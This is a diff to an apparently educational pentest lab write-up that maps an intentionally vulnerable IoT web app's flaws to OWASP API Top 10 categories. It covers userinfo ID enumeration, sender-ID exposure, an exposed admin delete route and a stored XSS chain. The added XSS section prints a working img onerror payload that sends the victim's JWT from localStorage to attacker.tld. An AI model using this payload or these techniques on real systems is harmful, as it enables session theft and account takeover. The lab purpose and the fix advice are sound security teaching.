@@ -3,7 +3,7 @@
 
 ## 1. Userinfo leak
 
-> **ATTACK DOCUMENTATION PENDING**
+> **DONE**
 
 - The `/api/v1/userinfo?id=...` endpoint allows retrieval of sensitive information (username, role, etc.) for **any user** simply by knowing their identifier.
 - Resources such as _admin_access.js_ call `/api/v2/userinfo` to obtain data for the user attempting access, utilizing the identifier present in their token. This endpoint **does** validate who is requesting the user data, whereas the previous version does not, as it was originally intended for debugging purposes.
@@ -11,6 +11,25 @@
 - The frontend ([admin_access.js](app://obsidian.md/index.html)) uses this endpoint to validate the user's role. However, **the endpoint does not verify whether the requester has permission** to access the requested user's data. The frontend assumes that if this function returns a role of _"admin"_, it can then request the administration panel via POST to _/admin_, which will allow access to administrator functionalities. The issue arises because the frontend code reveals an internal server route, _/api/v2/userinfo_, which suggests the possibility of accessing a previous version that does not validate the requesting user.
 - An attacker can **enumerate IDs** and obtain a map of users, their roles, and installed cameras, facilitating privilege escalation attacks, internal phishing, or resource mapping.
 
+Any user can access /admin panel in order to validate its role. If the user is not an admin account, the panel will refuse the access attempt. Pressing "Validate Access" button will call for /admin/v2/userinfo in order to get user's information to check this. This endpoint is secured up so an user cannot use it to get other users information.
+
+![[api1-restricted-access.png]]
+
+![[api1-userinfo.png]]
+
+The endpoint filters user information using the JWT auth token, but it also accepts an ID via URL parameters. This design decision allows administrators to retrieve information from other accounts.
+
+![[api1-id-parameter.png]]
+
+However, users with the `viewer` role are restricted from retrieving information from other accounts.
+
+![[api1-retrieve-others-info.png]]
+
+> **NOTE:** Remember that the primary goal of this platform is learning; you are encouraged to do whatever it takes to achieve it. Feel free to use the provided user credentials to inspect MongoDB collections or access the Raspberry Pi via SSH. Black-box, gray-box, and white-box approaches are all valid methodologies for learning how to pentest IoT products.
+
+As previously mentioned, the API exposes an older version of the `userinfo` function. This initial version does not validate whether the requesting user has administrative privileges.
+
+![[api1-v1-userinfo.png]]
 
 ## 2. Bypass: /snapshot endpoint
 ### Relevant code in app.py (/snapshot)::
@@ -217,7 +236,7 @@ The server's response instructs the user to check the messaging section for a re
 
 By analyzing the data traffic for the _/messages_ endpoint, it is observed that the rendered template is first retrieved. Subsequently, the browser's JavaScript code sends a request to _/api/messages_, receiving data in JSON format. The response contains a _messages_ list, which includes details of received messages. Each message contains the identifiers of both the sender and the recipient. The automatic confirmation message is sent by the system administrator, thereby revealing their user ID.
 
-![[api2_seder_id_filtered.png]]
+![[api2_sender_id_filtered.png]]
 
 This scenario is known as _Excessive Data Exposure_ and is categorized under [Broken Object Property Level Authorization](app://obsidian.md/index.html#api3-2023-broken-object-property-level-authorization). The _/api/messages_ endpoint exposes the sender's user ID, which is a sensitive property and should not be accessible to regular users.
 
@@ -255,7 +274,9 @@ Using the newly generated token, authentication as the administrator is possible
 
 > **DONE**
 
-The _/api/messages_ endpoint exposes sensitive information by revealing the identifier of the user who sends each message. This information can be leveraged to perform attacks such as the previously described [[API - Vulnerabilities and features#API2 2023 - Broken Authentication|JWT exploitation]].
+The _/api/messages_ endpoint exposes sensitive information by revealing the identifier of the user who sends each message. This information can be leveraged to perform attacks such as the previously described [[#3. Insecure JWT]].
+
+![[api2_sender_id_filtered.png]]
 ## Session token capture - Mass Assignment
 
 > **NOT DONE**
@@ -360,13 +381,15 @@ In summary, administrative access control is insufficient, as it depends on a cl
 
 ## Demonstration
 
-_profile.js_ exposes the route used by the administrator to delete users.
+_profile.js_ exposes the route used by the administrator to delete users. This design flaw (failing to separate admin functions from lower-privileged user roles) leads to an exposure of administrative endpoints.
 
 ![[api5_JS_exposes_admin_function.png]]
 
 If we attempt to manipulate the account deletion action, we observe that our user identifier is used to perform the deletion, along with the _/admin/users_ route, confirming that an administrative function is being invoked. By specifying the identifier of another user, such as _elliot_, the laboratory provides a hint.
 
 ![[api5_elliot.png]]
+
+> **NOTE:** You may wonder how an attacker can get other users' ID. Check [[#API3 2023 - Broken Object Property Level Authorization]], [[#1. Userinfo leak]], [[#Attack Vector 2 Information Disclosure via System Logs]] and [[#API8 2023 - Security Misconfiguration]].
 
 ![[api5_user_delete_attempt.png]]
 
@@ -641,5 +664,35 @@ As you can see, the message has been recorded along with the other messages addr
 ![[api10_message_received.png]]
 
 ![[api10_user_peter_received_message_CSRF.png]]
+
+## Stored XSS in the message reader (chained with API10)
+
+> **DONE**
+
+The same trust boundary abused above turns into a Stored Cross-Site Scripting sink. `POST /api/messages` stores the client-supplied `message` body verbatim, with no sanitization, and the inbox reader renders that body as HTML instead of text. The system messages (welcome and support auto-replies) are authored as HTML, which is why the reader renders markup rather than escaping it:
+
+```js
+// static/js/messages.js
+document.getElementById('readerBody').innerHTML = m.body || '';
+```
+
+Because the opened message is injected with `innerHTML`, any markup in the body is rendered inside the recipient's authenticated session. The inbox list still uses `escapeHtml()`, so only opening the message triggers the payload.
+
+Chained with the API10 sender spoofing, the attacker sends a message that appears to come from `admin` and carries an HTML payload. A `<script>` element inserted through `innerHTML` does not execute, so the working vector is an event handler or an inline form:
+
+```html
+<img src=x onerror="fetch('https://attacker.tld/x?j='+localStorage.getItem('jwt'))">
+```
+
+When the victim opens the message the handler fires and exfiltrates the victim's JWT, which is also stored in plaintext by the mobile app (see [[Mobile - Vulnerabilities and features#M9 Insecure Data Storage|M9 - Insecure Data Storage]]). An inline fake login form is an equally effective phishing variant, reinforcing the spoofing scenario documented above.
+
+**Impact:**
+- Theft of the victim's session JWT in their browser context.
+- High-fidelity internal phishing (spoofed admin sender plus rendered HTML).
+- Account takeover when the stolen token belongs to a privileged user.
+
+**OWASP mapping.** Stored XSS (CWE-79) is not a standalone category in the OWASP API Security Top 10 2023. Here it is the output-side consequence of API10:2023, the frontend consuming and rendering client-supplied data with no output encoding. Root cause: unsanitized storage in `POST /api/messages` plus `innerHTML` rendering in the reader.
+
+**Recommendation.** Bind the message sender to the authenticated JWT (the API10 fix) and, when rendering, either use `textContent` or sanitize the body against an allowlist of formatting tags, stripping event handlers and scriptable elements.
 
 > **INTRODUCE EXAMPLE WITH PASSWORD CHANGE CSRF**
